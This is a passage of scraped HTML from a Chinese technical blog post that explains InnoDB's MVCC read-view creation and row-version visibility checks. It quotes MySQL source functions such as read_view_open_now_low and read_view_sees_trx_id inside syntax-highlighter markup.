crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrow_search_for_mysql:\r\n// 这边只有select不加锁模式的时候才会创建一致性视图\r\nelse if (prebuilt-&gt;select_lock_type == LOCK_NONE) {\t\t// 创建一致性视图\r\n\t\ttrx_assign_read_view(trx);\r\n\t\tprebuilt-&gt;sql_stat_start = FALSE;\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6e531070532-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6e531070532-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6e531070532-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6e531070532-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6e531070532-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e6e531070532-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e6e531070532-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e6e531070532-1\"><span class=\"crayon-v\">row_search_for_mysql</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6e531070532-2\"><span class=\"crayon-c\">// 这边只有select不加锁模式的时候才会创建一致性视图</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e6e531070532-3\"><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">prebuilt</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">select_lock_type</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LOCK_NONE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 创建一致性视图</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6e531070532-4\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">trx_assign_read_view</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">trx</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e6e531070532-5\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">prebuilt</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">sql_stat_start</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">FALSE</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e6e531070532-6\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e6e531070532-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>上面的注释就是select for update(in share model)不会走MVCC的原因。让我们进一步分析trx_assign_read_view函数:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e72034604322\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntrx_assign_read_view\r\n |-read_view_open_now\r\n \t|-read_view_open_now_low\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e72034604322-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e72034604322-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e72034604322-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e72034604322-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e72034604322-1\"><span class=\"crayon-v\">trx_assign_read_view</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e72034604322-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">read_view_open_now</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e72034604322-3\"><span class=\"crayon-h\"> \t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">read_view_open_now</span><span class=\"crayon-sy\">_</span>low</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e72034604322-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>好了，终于到了创建read_view的主要阶段,主要过程如下图所示:</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/46c028eeb0667ba71f89cbda878bad30.png\" alt=\"\"></p>\n<p>代码过程为:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e75835308834\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic read_view_t* read_view_open_now_low(trx_id_t\tcr_trx_id,mem_heap_t*\theap)\r\n{\r\n\tread_view_t*\tview;\r\n\t// 当前事务系统中最大的事务id设置为low_limit_no\r\n\tview-&gt;low_limit_no = trx_sys-&gt;max_trx_id;\r\n\tview-&gt;low_limit_id = view-&gt;low_limit_no;\r\n\t// CreateView构造函数，会将非当前事务和已经在内存中提交的事务给剔除，即判断条件为\r\n\t// trx-&gt;id != m_view-&gt;creator_trx_id&amp;&amp; !trx_state_eq(trx, TRX_STATE_COMMITTED_IN_MEMORY)的\r\n\t// 才加入当前视图列表\r\n\tut_list_map(trx_sys-&gt;rw_trx_list, &amp;trx_t::trx_list, CreateView(view));\r\n\tif (view-&gt;n_trx_ids &gt; 0) {\r\n\t\t// 将当前事务系统中的最小id设置为up_limit_id,因为是逆序排列\r\n\t\tview-&gt;up_limit_id = view-&gt;trx_ids[view-&gt;n_trx_ids - 1];\r\n\t} else {\r\n\t\t// 如果当前没有非当前事务之外的活跃事务，则设置为low_limit_id\r\n\t\tview-&gt;up_limit_id = view-&gt;low_limit_id;\r\n\t}\r\n\t// 忽略purge事务，purge时，当前事务id是0\r\n\tif (cr_trx_id &gt; 0) {\r\n\t\tread_view_add(view);\r\n\t}\r\n\t// 返回一致性视图\r\n\treturn(view);\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e75835308834-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e75835308834-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">read_view_t*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">read_view_open_now_low</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">trx_id_t\t</span><span class=\"crayon-v\">cr_trx_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e \">mem_heap_t*</span><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">heap</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e \">read_view_t*</span><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 当前事务系统中最大的事务id设置为low_limit_no</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">low_limit_no</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trx_sys</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">max_trx_id</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">low_limit_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">low_limit_no</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// CreateView构造函数，会将非当前事务和已经在内存中提交的事务给剔除，即判断条件为</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// trx-&gt;id != m_view-&gt;creator_trx_id&amp;&amp; !trx_state_eq(trx, TRX_STATE_COMMITTED_IN_MEMORY)的</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 才加入当前视图列表</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">ut_list_map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">trx_sys</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">rw_trx_list</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">trx_t</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">trx_list</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CreateView</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">n_trx_ids</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-12\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 将当前事务系统中的最小id设置为up_limit_id,因为是逆序排列</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-13\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">up_limit_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">trx_ids</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">n_trx_ids</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-15\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-c\">// 如果当前没有非当前事务之外的活跃事务，则设置为low_limit_id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-16\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">up_limit_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">view</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">low_limit_id</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-17\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-18\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 忽略purge事务，purge时，当前事务id是0</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-19\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cr_trx_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-20\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-e\">read_view_add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-21\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-22\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 返回一致性视图</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-23\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">view</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670167e75835308834-24\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670167e75835308834-25\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0066 seconds] -->\r\n<p></p>\n<h3>行版本可见性:</h3>\n<p>由上面的lock_clust_rec_cons_read_sees可知,行版本可见性由read_view_sees_trx_id函数判断:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e79641856186\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/*********************************************************************//**\r\nChecks if a read view sees the specified transaction.\r\n&lt;a href='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;\ttrue if sees */\r\nUNIV_INLINE\r\nbool\r\nread_view_sees_trx_id(\r\n/*==================*/\r\n\tconst read_view_t*\tview,\t/*!&lt; in: read view */\r\n\ttrx_id_t\t\ttrx_id)\t/*!&lt; in: trx id */\r\n{\r\n\tif (trx_id &lt; view-&gt;up_limit_id) {\r\n\r\n\t\treturn(true);\r\n\t} else if (trx_id &gt;= view-&gt;low_limit_id) {\r\n\r\n\t\treturn(false);\r\n\t} else {\r\n\t\tulint\tlower = 0;\r\n\t\tulint\tupper = view-&gt;n_trx_ids - 1;\r\n\r\n\t\tut_a(view-&gt;n_trx_ids &gt; 0);\r\n\r\n\t\tdo {\r\n\t\t\tulint\t\tmid\t= (lower + upper) &gt;&gt; 1;\r\n\t\t\ttrx_id_t\tmid_id\t= view-&gt;trx_ids[mid];\r\n\r\n\t\t\tif (mid_id == trx_id) {\r\n\t\t\t\treturn(FALSE);\r\n\t\t\t} else if (mid_id &lt; trx_id) {\r\n\t\t\t\tif (mid &gt; 0) {\r\n\t\t\t\t\tupper = mid - 1;\r\n\t\t\t\t} else {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\tlower = mid + 1;\r\n\t\t\t}\r\n\t\t} while (lower &lt;= upper);\r\n\t}\r\n\r\n\treturn(true);\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e79641856186-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e79641856186-33\">33</div><div class=\"crayon-num crayon-striped-num\" 